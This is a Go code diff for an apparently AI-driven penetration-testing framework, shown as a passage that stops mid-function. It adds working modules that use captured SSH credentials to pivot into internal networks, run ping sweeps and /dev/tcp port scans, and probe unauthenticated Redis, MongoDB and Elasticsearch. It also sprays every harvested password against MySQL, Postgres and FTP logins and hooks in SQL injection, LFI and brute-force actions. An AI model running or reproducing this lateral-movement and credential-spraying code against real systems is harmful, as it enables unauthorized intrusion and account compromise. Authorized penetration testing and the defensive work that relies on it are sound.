@@ -3,6 +3,7 @@ package ai
 import (
 	"bufio"
 	"context"
+	"database/sql"
 	"fmt"
 	"net"
 	"os/exec"
@@ -10,6 +11,8 @@ import (
 	"strings"
 	"time"
 
+	_ "github.com/go-sql-driver/mysql"
+	_ "github.com/lib/pq"
 	"pentestai/internal/exploit"
 	"pentestai/internal/recon"
 	"pentestai/internal/webapp"
@@ -89,6 +92,40 @@ func getOpt(opts map[string]interface{}, key string) string {
 		}
 	}
 	return ""
+}
+
+// extractHost extracts just the hostname from a target string (removes protocol, port, path)
+func extractHost(target string) string {
+	t := target
+	t = strings.TrimPrefix(t, "http://")
+	t = strings.TrimPrefix(t, "https://")
+	if idx := strings.Index(t, "/"); idx > 0 {
+		t = t[:idx]
+	}
+	if idx := strings.Index(t, ":"); idx > 0 {
+		t = t[:idx]
+	}
+	return t
+}
+
+// extractHostAndPort extracts host and port from target string (e.g., "127.0.0.1:8080" -> "127.0.0.1", 8080)
+func extractHostAndPort(target string) (string, int) {
+	t := target
+	t = strings.TrimPrefix(t, "http://")
+	t = strings.TrimPrefix(t, "https://")
+	if idx := strings.Index(t, "/"); idx > 0 {
+		t = t[:idx]
+	}
+
+	host := t
+	port := 0
+	if idx := strings.LastIndex(t, ":"); idx > 0 {
+		host = t[:idx]
+		if p, err := strconv.Atoi(t[idx+1:]); err == nil {
+			port = p
+		}
+	}
+	return host, port
 }
 
 func (r *AutoRunner) SetCallbacks(cb RunnerCallbacks) {
@@ -225,6 +262,10 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionFullScan(ctx, action, decision)
 	case "ssh_recon":
 		return r.actionSSHRecon(ctx, action, decision)
+	case "ssh_pivot":
+		return r.actionSSHPivot(ctx, action, decision)
+	case "pivot_scan":
+		return r.actionPivotScan(ctx, action, decision)
 	case "reverse_shell":
 		return r.actionReverseShell(ctx, action, decision)
 	case "cred_spray":
@@ -271,6 +312,23 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionGRPCExploit(ctx, action, decision)
 	case "msrpc_scan":
 		return r.actionMSRPCScan(ctx, action, decision)
+	// New curious modules
+	case "dir_bruteforce":
+		return r.actionDirBruteforce(ctx, action, decision)
+	case "sqli", "sqli_test":
+		return r.actionSQLiTest(ctx, action, decision)
+	case "lfi_test", "lfi":
+		return r.actionLFITest(ctx, action, decision)
+	case "ldap_check", "check_ldap":
+		return r.actionLDAPCheck(ctx, action, decision)
+	case "snmp_check", "check_snmp":
+		return r.actionSNMPCheck(ctx, action, decision)
+	case "subdomain_scan":
+		return r.actionSubdomainScan(ctx, action, decision)
+	case "dns_zone_transfer":
+		return r.actionDNSZoneTransfer(ctx, action, decision)
+	case "banner_grab":
+		return r.actionBannerGrab(ctx, action, decision)
 	default:
 		action.Result = fmt.Sprintf("Unknown action: %s", decision.Action)
 		action.Success = false
@@ -1266,6 +1324,451 @@ func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decisio
 	return action, nil
 }
 
+// actionSSHPivot uses SSH access to discover internal networks and hosts
+func (r *AutoRunner) actionSSHPivot(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	// Parse target
+	target := decision.Target
+	port := "22"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		target = parts[0]
+		port = parts[1]
+	}
+
+	// Find SSH credentials from state
+	var username, password string
+	targetKey := fmt.Sprintf("%s:%s", target, port)
+	for _, cred := range r.state.Credentials {
+		if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == target || strings.HasPrefix(cred.Target, target)) {
+			username = cred.Username
+			password = cred.Password
+			break
+		}
+	}
+
+	if username == "" || password == "" {
+		action.Result = "SSH pivot requires credentials - run ssh_login first"
+		action.Success = false
+		return action, nil
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("\n=== SSH PIVOT SCAN FROM %s:%s as %s ===\n\n", target, port, username))
+
+	// Commands to discover internal networks and hosts
+	pivotCommands := []struct {
+		cmd  string
+		desc string
+	}{
+		{"ip addr show 2>/dev/null || ifconfig", "Network Interfaces"},
+		{"ip route show 2>/dev/null || route -n", "Routing Table"},
+		{"cat /etc/resolv.conf 2>/dev/null", "DNS Configuration"},
+		{"arp -a 2>/dev/null || ip neigh show", "ARP Cache (nearby hosts)"},
+		{"cat /etc/hosts", "Hosts File"},
+		{"ss -tulpn 2>/dev/null || netstat -tulpn", "Listening Services"},
+		// Scan common internal subnets for live hosts
+		{"for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.1.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null | head -20", "192.168.1.0/24 Live Hosts"},
+		{"for i in $(seq 1 254); do (ping -c 1 -W 1 10.0.0.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null | head -20", "10.0.0.0/24 Live Hosts"},
+		{"for i in $(seq 1 20); do (ping -c 1 -W 1 172.17.0.$i 2>/dev/null | grep 'bytes from' &); done; wait 2>/dev/null", "Docker Network (172.17.0.0/24)"},
+		// Check for common internal services
+		{"(echo > /dev/tcp/172.17.0.1/22 2>/dev/null && echo '172.17.0.1:22 OPEN') || echo '172.17.0.1:22 closed'", "Docker Host SSH"},
+		{"(echo > /dev/tcp/172.17.0.1/3306 2>/dev/null && echo '172.17.0.1:3306 OPEN') || echo '172.17.0.1:3306 closed'", "Docker Host MySQL"},
+		// Find other Docker containers
+		{"cat /etc/hostname", "Container Hostname"},
+		{"cat /proc/1/cgroup 2>/dev/null | head -5", "Container Detection"},
+		{"env | grep -i docker || env | grep -i kube || echo 'No container env vars'", "Container Environment"},
+	}
+
+	// Execute via SSH
+	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
+		action.Result = fmt.Sprintf("Module error: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	module := r.framework.Current()
+	module.SetOption("RHOSTS", target)
+	module.SetOption("RPORT", port)
+	module.SetOption("USERNAME", username)
+	module.SetOption("PASSWORD", password)
+
+	var discoveredHosts []string
+	var discoveredNetworks []string
+
+	for _, cmd := range pivotCommands {
+		module.SetOption("CMD", cmd.cmd)
+		result, err := module.Run(ctx)
+
+		sb.WriteString(fmt.Sprintf("--- %s ---\n", cmd.desc))
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("Error: %v\n", err))
+		} else if result.Output != "" {
+			sb.WriteString(result.Output)
+			sb.WriteString("\n")
+
+			// Parse discovered networks
+			if strings.Contains(cmd.desc, "Network Interfaces") || strings.Contains(cmd.desc, "Routing") {
+				lines := strings.Split(result.Output, "\n")
+				for _, line := range lines {
+					// Look for IP addresses
+					if strings.Contains(line, "inet ") || strings.Contains(line, "inet6") {
+						parts := strings.Fields(line)
+						for _, part := range parts {
+							if strings.Contains(part, ".") && !strings.HasPrefix(part, "127.") {
+								discoveredNetworks = append(discoveredNetworks, part)
+							}
+						}
+					}
+				}
+			}
+
+			// Parse discovered hosts
+			if strings.Contains(cmd.desc, "Live Hosts") || strings.Contains(cmd.desc, "ARP") {
+				lines := strings.Split(result.Output, "\n")
+				for _, line := range lines {
+					if strings.Contains(line, "bytes from") || strings.Contains(line, "OPEN") {
+						// Extract IP from ping output
+						parts := strings.Fields(line)
+						for _, part := range parts {
+							part = strings.Trim(part, "():")
+							if strings.Count(part, ".") == 3 && !strings.HasPrefix(part, "127.") {
+								discoveredHosts = append(discoveredHosts, part)
+							}
+						}
+					}
+				}
+			}
+		}
+		sb.WriteString("\n")
+	}
+
+	// Summary
+	sb.WriteString("\n=== PIVOT DISCOVERY SUMMARY ===\n")
+	if len(discoveredNetworks) > 0 {
+		sb.WriteString(fmt.Sprintf("Networks Found: %v\n", discoveredNetworks))
+	}
+	if len(discoveredHosts) > 0 {
+		sb.WriteString(fmt.Sprintf("Live Hosts Found: %v\n", discoveredHosts))
+		sb.WriteString("\n[!] These hosts can be targeted for further exploitation!\n")
+	}
+
+	// Add discovered hosts to state for further scanning
+	for _, host := range discoveredHosts {
+		// Check if already in state
+		found := false
+		for _, h := range r.state.DiscoveredHosts {
+			if h.IP == host {
+				found = true
+				break
+			}
+		}
+		if !found {
+			r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
+				IP:     host,
+				Status: "pivot_discovered",
+			})
+		}
+	}
+
+	// Add finding
+	if len(discoveredHosts) > 0 || len(discoveredNetworks) > 0 {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "internal_network_discovery",
+			Severity:    "high",
+			Target:      fmt.Sprintf("%s:%s", target, port),
+			Description: fmt.Sprintf("SSH pivot revealed %d internal networks and %d live hosts", len(discoveredNetworks), len(discoveredHosts)),
+			Evidence:    fmt.Sprintf("Networks: %v\nHosts: %v", discoveredNetworks, discoveredHosts),
+			Remediation: "Implement network segmentation, restrict SSH access, use bastion hosts",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(Finding{
+				Type:        "internal_network_discovery",
+				Severity:    "high",
+				Target:      fmt.Sprintf("%s:%s", target, port),
+				Description: fmt.Sprintf("Pivot scan found %d hosts via SSH", len(discoveredHosts)),
+			})
+		}
+	}
+
+	action.Result = sb.String()
+	action.Success = len(discoveredHosts) > 0 || len(discoveredNetworks) > 0
+	action.Data["discovered_hosts"] = discoveredHosts
+	action.Data["discovered_networks"] = discoveredNetworks
+	action.Data["pivot_host"] = target
+	action.Data["pivot_port"] = port
+
+	return action, nil
+}
+
+// actionPivotScan performs deep port scanning on discovered internal hosts via SSH
+func (r *AutoRunner) actionPivotScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	// Get pivot host and target internal host from decision
+	// Format: pivot_scan internal_ip via pivot_host:port
+	// Or use discovered hosts from state
+
+	// Find SSH credentials and pivot info from previous ssh_pivot action
+	var pivotHost, pivotPort, pivotUser, pivotPass string
+	for i := len(r.state.ActionHistory) - 1; i >= 0; i-- {
+		hist := r.state.ActionHistory[i]
+		if hist.Type == "ssh_pivot" && hist.Success {
+			if h, ok := hist.Data["pivot_host"].(string); ok {
+				pivotHost = h
+			}
+			if p, ok := hist.Data["pivot_port"].(string); ok {
+				pivotPort = p
+			}
+			break
+		}
+	}
+
+	// Get SSH credentials
+	targetKey := fmt.Sprintf("%s:%s", pivotHost, pivotPort)
+	for _, cred := range r.state.Credentials {
+		if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == pivotHost || strings.HasPrefix(cred.Target, pivotHost)) {
+			pivotUser = cred.Username
+			pivotPass = cred.Password
+			break
+		}
+	}
+
+	if pivotHost == "" || pivotUser == "" {
+		action.Result = "No pivot host or credentials available - run ssh_pivot first"
+		action.Success = false
+		return action, nil
+	}
+
+	// Get internal hosts to scan
+	var internalHosts []string
+	for _, host := range r.state.DiscoveredHosts {
+		if host.Status == "pivot_discovered" {
+			internalHosts = append(internalHosts, host.IP)
+		}
+	}
+
+	if len(internalHosts) == 0 {
+		action.Result = "No internal hosts discovered - run ssh_pivot first"
+		action.Success = false
+		return action, nil
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("\n=== DEEP SCAN OF INTERNAL HOSTS VIA %s ===\n\n", pivotHost))
+
+	// Set up SSH module
+	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
+		action.Result = fmt.Sprintf("Module error: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	module := r.framework.Current()
+	module.SetOption("RHOSTS", pivotHost)
+	module.SetOption("RPORT", pivotPort)
+	module.SetOption("USERNAME", pivotUser)
+	module.SetOption("PASSWORD", pivotPass)
+
+	// Common ports to scan on internal hosts
+	commonPorts := []int{22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017, 9200, 5000, 3000, 21, 25, 53, 139, 445, 1433, 5900}
+
+	totalFindings := 0
+	for _, internalHost := range internalHosts {
+		sb.WriteString(fmt.Sprintf("\n--- Scanning %s ---\n", internalHost))
+
+		// Quick TCP scan using bash
+		scanCmd := fmt.Sprintf(`for port in %s; do (echo > /dev/tcp/%s/$port 2>/dev/null && echo "$port OPEN") & done; wait 2>/dev/null`,
+			portsToString(commonPorts), internalHost)
+
+		module.SetOption("CMD", scanCmd)
+		result, err := module.Run(ctx)
+
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("Scan error: %v\n", err))
+			continue
+		}
+
+		openPorts := []int{}
+		if result.Output != "" {
+			lines := strings.Split(result.Output, "\n")
+			for _, line := range lines {
+				if strings.Contains(line, "OPEN") {
+					parts := strings.Fields(line)
+					if len(parts) > 0 {
+						if port, err := strconv.Atoi(parts[0]); err == nil {
+							openPorts = append(openPorts, port)
+							sb.WriteString(fmt.Sprintf("  [+] Port %d OPEN\n", port))
+						}
+					}
+				}
+			}
+		}
+
+		if len(openPorts) == 0 {
+			sb.WriteString("  No open ports found on common ports\n")
+			continue
+		}
+
+		// Service identification on open ports
+		for _, port := range openPorts {
+			// Try to grab banner
+			bannerCmd := fmt.Sprintf(`timeout 2 bash -c 'exec 3<>/dev/tcp/%s/%d; echo -e "HEAD / HTTP/1.0\r\n\r\n" >&3; cat <&3' 2>/dev/null | head -5`, internalHost, port)
+			module.SetOption("CMD", bannerCmd)
+			bannerResult, _ := module.Run(ctx)
+
+			serviceName := identifyServiceByPort(port)
+			banner := ""
+			if bannerResult != nil && bannerResult.Output != "" {
+				banner = strings.TrimSpace(bannerResult.Output)
+				if len(banner) > 100 {
+					banner = banner[:100] + "..."
+				}
+			}
+
+			sb.WriteString(fmt.Sprintf("  [*] %d/%s", port, serviceName))
+			if banner != "" {
+				sb.WriteString(fmt.Sprintf(" - %s", banner))
+			}
+			sb.WriteString("\n")
+
+			// Add to state as discovered service
+			r.state.Services = append(r.state.Services, ServiceInfo{
+				Host:   internalHost,
+				Port:   port,
+				Name:   serviceName,
+				Banner: banner,
+			})
+
+			// Add open port to state
+			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
+				Host:     internalHost,
+				Port:     port,
+				Protocol: "tcp",
+				State:    "open",
+			})
+		}
+
+		// Add vulnerability finding for each internal host with services
+		if len(openPorts) > 0 {
+			totalFindings++
+			finding := Finding{
+				Type:        "internal_host_services",
+				Severity:    "high",
+				Target:      internalHost,
+				Description: fmt.Sprintf("Internal host %s has %d open ports accessible via pivot", internalHost, len(openPorts)),
+				Evidence:    fmt.Sprintf("Open ports: %v", openPorts),
+				Remediation: "Implement network segmentation, firewall rules between network segments",
+				Timestamp:   time.Now(),
+			}
+			r.state.Vulnerabilities = append(r.state.Vulnerabilities, finding)
+
+			if r.callbacks.OnFinding != nil {
+				r.callbacks.OnFinding(finding)
+			}
+
+			// Update host status
+			for i, h := range r.state.DiscoveredHosts {
+				if h.IP == internalHost {
+					r.state.DiscoveredHosts[i].Status = "scanned"
+					break
+				}
+			}
+		}
+
+		// Quick vulnerability checks on interesting ports
+		for _, port := range openPorts {
+			switch port {
+			case 6379: // Redis
+				redisCmd := fmt.Sprintf(`echo "INFO" | timeout 2 nc %s %d 2>/dev/null | head -10`, internalHost, port)
+				module.SetOption("CMD", redisCmd)
+				redisResult, _ := module.Run(ctx)
+				if redisResult != nil && strings.Contains(redisResult.Output, "redis_version") {
+					sb.WriteString(fmt.Sprintf("  [!] CRITICAL: Redis on %s:%d - NO AUTH REQUIRED!\n", internalHost, port))
+					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+						Type:        "internal_redis_unauth",
+						Severity:    "critical",
+						Target:      fmt.Sprintf("%s:%d", internalHost, port),
+						Description: "Internal Redis instance has no authentication",
+						Remediation: "Enable Redis authentication with requirepass",
+						Timestamp:   time.Now(),
+					})
+					if r.callbacks.OnFinding != nil {
+						r.callbacks.OnFinding(Finding{
+							Type:     "internal_redis_unauth",
+							Severity: "critical",
+							Target:   fmt.Sprintf("%s:%d", internalHost, port),
+						})
+					}
+				}
+
+			case 27017: // MongoDB
+				mongoCmd := fmt.Sprintf(`echo 'db.adminCommand({listDatabases:1})' | timeout 2 nc %s %d 2>/dev/null`, internalHost, port)
+				module.SetOption("CMD", mongoCmd)
+				mongoResult, _ := module.Run(ctx)
+				if mongoResult != nil && (strings.Contains(mongoResult.Output, "databases") || strings.Contains(mongoResult.Output, "admin")) {
+					sb.WriteString(fmt.Sprintf("  [!] CRITICAL: MongoDB on %s:%d - NO AUTH REQUIRED!\n", internalHost, port))
+					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+						Type:        "internal_mongodb_unauth",
+						Severity:    "critical",
+						Target:      fmt.Sprintf("%s:%d", internalHost, port),
+						Description: "Internal MongoDB instance has no authentication",
+						Remediation: "Enable MongoDB authentication",
+						Timestamp:   time.Now(),
+					})
+				}
+
+			case 9200: // Elasticsearch
+				esCmd := fmt.Sprintf(`curl -s --connect-timeout 2 http://%s:%d/ 2>/dev/null | head -20`, internalHost, port)
+				module.SetOption("CMD", esCmd)
+				esResult, _ := module.Run(ctx)
+				if esResult != nil && strings.Contains(esResult.Output, "cluster_name") {
+					sb.WriteString(fmt.Sprintf("  [!] HIGH: Elasticsearch on %s:%d - Exposed!\n", internalHost, port))
+					r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+						Type:        "internal_elasticsearch_exposed",
+						Severity:    "high",
+						Target:      fmt.Sprintf("%s:%d", internalHost, port),
+						Description: "Internal Elasticsearch instance is accessible",
+						Remediation: "Enable X-Pack security or restrict network access",
+						Timestamp:   time.Now(),
+					})
+				}
+			}
+		}
+	}
+
+	sb.WriteString(fmt.Sprintf("\n=== PIVOT SCAN COMPLETE: %d hosts scanned, %d with services ===\n", len(internalHosts), totalFindings))
+
+	action.Result = sb.String()
+	action.Success = totalFindings > 0
+
+	return action, nil
+}
+
+// portsToString converts port slice to space-separated string
+func portsToString(ports []int) string {
+	var parts []string
+	for _, p := range ports {
+		parts = append(parts, strconv.Itoa(p))
+	}
+	return strings.Join(parts, " ")
+}
+
+// identifyServiceByPort returns common service name for port
+func identifyServiceByPort(port int) string {
+	services := map[int]string{
+		21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
+		80: "http", 110: "pop3", 139: "netbios", 143: "imap", 443: "https",
+		445: "smb", 1433: "mssql", 1521: "oracle", 3306: "mysql",
+		3389: "rdp", 5432: "postgresql", 5900: "vnc", 6379: "redis",
+		8080: "http-proxy", 8443: "https-alt", 9200: "elasticsearch",
+		27017: "mongodb", 5000: "flask", 3000: "nodejs",
+	}
+	if name, ok := services[port]; ok {
+		return name
+	}
+	return "unknown"
+}
+
 // actionReverseShell generates reverse shell payloads for all supported shell types
 func (r *AutoRunner) actionReverseShell(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
 	if err := r.framework.Use("exploit/multi/handler"); err != nil {
@@ -1320,122 +1823,187 @@ func (r *AutoRunner) actionReverseShell(ctx context.Context, action *Action, dec
 
 // actionCredSpray tries credentials on various services (FTP, MySQL, HTTP, Redis)
 func (r *AutoRunner) actionCredSpray(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
-	username := getOpt(decision.Options, "username")
-	password := getOpt(decision.Options, "password")
-	service := getOpt(decision.Options, "service")
-
-	if username == "" || password == "" || service == "" {
-		action.Result = "Credential spray requires username, password, and service"
-		action.Success = false
-		return action, nil
-	}
-
-	// Parse target
+	// Get target IP
 	target := decision.Target
-	port := ""
 	if strings.Contains(target, ":") {
-		parts := strings.Split(target, ":")
-		target = parts[0]
-		port = parts[1]
+		target = strings.Split(target, ":")[0]
+	}
+	if target == "" {
+		target = r.state.Target
 	}
 
-	var modulePath string
-	switch service {
-	case "ftp":
-		modulePath = "auxiliary/scanner/ftp/ftp_login"
-		if port == "" {
-			port = "21"
+	// Collect all unique username:password pairs from discovered credentials
+	type credPair struct{ username, password string }
+	credSet := make(map[credPair]bool)
+	for _, cred := range r.state.Credentials {
+		if cred.Username != "" && cred.Password != "" {
+			credSet[credPair{cred.Username, cred.Password}] = true
 		}
-	case "mysql":
-		modulePath = "auxiliary/scanner/mysql/mysql_login"
-		if port == "" {
-			port = "3306"
-		}
-	case "http":
-		modulePath = "auxiliary/scanner/http/http_login"
-		if port == "" {
-			port = "80"
-		}
-	case "redis":
-		modulePath = "auxiliary/scanner/redis/redis_login"
-		if port == "" {
-			port = "6379"
-		}
-	default:
-		action.Result = fmt.Sprintf("Unsupported service for credential spray: %s", service)
+	}
+
+	if len(credSet) == 0 {
+		action.Result = "No credentials found to spray - discover credentials first via ssh_login, web exploits, etc."
 		action.Success = false
 		return action, nil
 	}
 
-	if err := r.framework.Use(modulePath); err != nil {
-		action.Result = fmt.Sprintf("Module error: %v", err)
+	// Define services to spray against
+	services := []struct {
+		name string
+		port int
+	}{
+		{"mysql", 3306},
+		{"postgres", 5432},
+		{"ftp", 21},
+	}
+
+	var results strings.Builder
+	results.WriteString(fmt.Sprintf("[*] Credential spray on %s\n", target))
+	results.WriteString(fmt.Sprintf("[*] Testing %d credential pairs against %d services\n\n", len(credSet), len(services)))
+
+	foundCount := 0
+
+	for cred := range credSet {
+		for _, svc := range services {
+			// Check if this port is open
+			portOpen := false
+			for _, p := range r.state.OpenPorts {
+				if p.Port == svc.port {
+					portOpen = true
+					break
+				}
+			}
+			if !portOpen {
+				continue
+			}
+
+			// Skip if we already have this credential for this service
+			alreadyFound := false
+			for _, existing := range r.state.Credentials {
+				if existing.Service == svc.name && existing.Username == cred.username {
+					alreadyFound = true
+					break
+				}
+			}
+			if alreadyFound {
+				continue
+			}
+
+			results.WriteString(fmt.Sprintf("[>] Trying %s:%s on %s:%d...", cred.username, cred.password, svc.name, svc.port))
+
+			success := false
+			switch svc.name {
+			case "mysql":
+				success = r.tryMySQLCreds(target, svc.port, cred.username, cred.password)
+			case "postgres":
+				success = r.tryPostgresCreds(target, svc.port, cred.username, cred.password)
+			case "ftp":
+				success = r.tryFTPCreds(target, svc.port, cred.username, cred.password)
+			}
+
+			if success {
+				foundCount++
+				results.WriteString(" [SUCCESS!]\n")
+
+				// Add credential
+				cf := CredentialFind{
+					Username: cred.username,
+					Password: cred.password,
+					Service:  svc.name,
+					Target:   fmt.Sprintf("%s:%d", target, svc.port),
+				}
+				r.state.Credentials = append(r.state.Credentials, cf)
+
+				if r.callbacks.OnCredential != nil {
+					r.callbacks.OnCredential(cf)
+				}
+
+				// Add finding
+				finding := Finding{
+					Type:        "credential_reuse",
+					Severity:    "high",
+					Target:      fmt.Sprintf("%s:%d", target, svc.port),
+					Service:     svc.name,
+					Description: fmt.Sprintf("Password reuse: %s credentials work on %s", cred.username, svc.name),
+					Remediation: "Use unique passwords for each service",
+					Timestamp:   time.Now(),
+				}
+				r.state.Vulnerabilities = append(r.state.Vulnerabilities, finding)
+
+				if r.callbacks.OnFinding != nil {
+					r.callbacks.OnFinding(finding)
+				}
+			} else {
+				results.WriteString(" [failed]\n")
+			}
+		}
+	}
+
+	if foundCount > 0 {
+		results.WriteString(fmt.Sprintf("\n[+] Credential spray complete: %d successful logins!\n", foundCount))
+		action.Success = true
+	} else {
+		results.WriteString("\n[-] Credential spray complete: no successful logins\n")
 		action.Success = false
-		return action, err
 	}
 
-	module := r.framework.Current()
-	module.SetOption("RHOSTS", target)
-	module.SetOption("RPORT", port)
-	module.SetOption("USERNAME", username)
-	module.SetOption("PASSWORD", password)
-	module.SetOption("STOP_ON_SUCCESS", "true")
-
-	result, err := module.Run(ctx)
-	if err != nil {
-		action.Result = fmt.Sprintf("Credential spray failed: %v", err)
-		action.Success = false
-		return action, err
-	}
-
-	if result.Success {
-		// Add finding
-		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
-			Type:        "credential_reuse",
-			Severity:    "high",
-			Target:      fmt.Sprintf("%s:%s", target, port),
-			Service:     service,
-			Description: fmt.Sprintf("Password reuse detected - %s credentials work on %s", username, service),
-			Remediation: "Use unique passwords for each service, implement credential rotation",
-			Timestamp:   time.Now(),
-		})
-
-		// Add credential
-		cf := CredentialFind{
-			Username: username,
-			Password: password,
-			Service:  service,
-			Target:   fmt.Sprintf("%s:%s", target, port),
-		}
-		r.state.Credentials = append(r.state.Credentials, cf)
-
-		if r.callbacks.OnCredential != nil {
-			r.callbacks.OnCredential(cf)
-		}
-
-		if r.callbacks.OnFinding != nil {
-			r.callbacks.OnFinding(Finding{
-				Type:        "credential_reuse",
-				Severity:    "high",
-				Target:      fmt.Sprintf("%s:%s", target, port),
-				Description: fmt.Sprintf("Credential reuse: %s works on %s", username, service),
-			})
-		}
-	}
-
-	action.Result = result.Output
-	if action.Result == "" {
-		if result.Success {
-			action.Result = fmt.Sprintf("SUCCESS: %s:%s works on %s:%s", username, password, service, port)
-		} else {
-			action.Result = fmt.Sprintf("FAILED: %s credentials rejected by %s:%s", username, service, port)
-		}
-	}
-	action.Success = result.Success
-	action.Data["service"] = service
-	action.Data["username"] = username
-
+	action.Result = results.String()
 	return action, nil
 }
+
+// Helper functions for credential testing
+func (r *AutoRunner) tryMySQLCreds(host string, port int, user, pass string) bool {
+	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/", user, pass, host, port)
+	db, err := sql.Open("mysql", dsn)
+	if err != nil {
+		return false
+	}
+	defer db.Close()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	return db.PingContext(ctx) == nil
+}
+
+func (r *AutoRunner) tryPostgresCreds(host string, port int, user, pass string) bool {
+	connStr := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=postgres sslmode=disable connect_timeout=5", host, port, user, pass)
+	db, err := sql.Open("postgres", connStr)
+	if err != nil {
+		return false
+	}
+	defer db.Close()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	return db.PingContext(ctx) == nil
+}
+
+func (r *AutoRunner) tryFTPCreds(host string, port int, user, pass string) bool {
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	reader := bufio.NewReader(conn)
+
+	// Read banner
+	reader.ReadString('\n')
+
+	// Send USER
+	fmt.Fprintf(conn, "USER %s\r\n", user)
+	resp, _ := reader.ReadString('\n')
+	if !strings.HasPrefix(resp, "331") {
+		return false
+	}
+
+	// Send PASS
+	fmt.Fprintf(conn, "PASS %s\r\n", pass)
+	resp, _ = reader.ReadString('\n')
+	return strings.HasPrefix(resp, "230")
+}
+
 
 // actionLFI tests for Local File Inclusion vulnerabilities
 func (r *AutoRunner) actionLFI(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
@@ -3172,6 +3740,231 @@ func (r *AutoRunner) actionMSRPCScan(ctx context.Context, action *Action, decisi
 			Description: "MS-RPC endpoint mapper exposed - potential attack surface",
 			Timestamp:   time.Now(),
 		})
+	}
+
+	return action, nil
+}
+
+// ============================================================================
+// NEW CURIOUS MODULES - MCP-based implementations
+// ============================================================================
+
+func (r *AutoRunner) actionDirBruteforce(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = fmt.Sprintf("http://%s", r.state.Target)
+	}
+	// Ensure URL format
+	if !strings.HasPrefix(target, "http") {
+		target = "http://" + target
+	}
+
+	result := r.framework.ExploitDB.DirBruteforce(target, "common", "")
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	// Parse for found paths
+	if strings.Contains(result.Output, "[FOUND]") || strings.Contains(result.Output, "[200 OK]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "exposed_paths",
+			Severity:    "medium",
+			Target:      target,
+			Description: "Exposed directories/files discovered via bruteforce",
+			Evidence:    result.Output,
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionSQLiTest(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = fmt.Sprintf("http://%s", r.state.Target)
+	}
+	if !strings.HasPrefix(target, "http") {
+		target = "http://" + target
+	}
+
+	result := r.framework.ExploitDB.SQLiTest(target)
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if strings.Contains(result.Output, "[VULNERABLE]") || strings.Contains(result.Output, "[CRITICAL]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "sql_injection",
+			Severity:    "critical",
+			Target:      target,
+			Description: "SQL Injection vulnerability detected",
+			Evidence:    result.Output,
+			Remediation: "Use parameterized queries and prepared statements",
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionLFITest(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = fmt.Sprintf("http://%s", r.state.Target)
+	}
+	if !strings.HasPrefix(target, "http") {
+		target = "http://" + target
+	}
+
+	result := r.framework.ExploitDB.LFITest(target, "")
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if strings.Contains(result.Output, "[VULNERABLE]") || strings.Contains(result.Output, "[CRITICAL]") {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "lfi",
+			Severity:    "critical",
+			Target:      target,
+			Description: "Local File Inclusion vulnerability detected",
+			Evidence:    result.Output,
+			Remediation: "Never include files based on user input, use whitelists",
+			Timestamp:   time.Now(),
+		})
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionLDAPCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := extractHost(decision.Target)
+	if target == "" {
+		target = r.state.Target
+	}
+
+	result := r.framework.ExploitDB.CheckLDAP(target, 389)
+
+	action.Result = result.Output
+	action.Success = result.Success
+
